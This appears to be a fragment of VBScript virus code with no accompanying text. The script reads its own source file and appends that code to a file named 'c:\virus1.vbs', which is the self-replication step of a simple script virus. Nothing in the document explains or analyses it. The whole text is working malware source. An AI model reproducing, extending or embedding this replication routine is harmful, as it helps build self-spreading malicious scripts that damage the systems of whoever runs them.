  set objFs=CreateObject("Scripting.FileSystemObject")
       set InF=objFs.OpenTextFile(WScript.ScriptFullname,1)
       set f=objFs.OpenTextFile("c:\virus1.vbs",8)
       InF= vbCrLf&InF.ReadAll
       f.Write InF
       f.Close
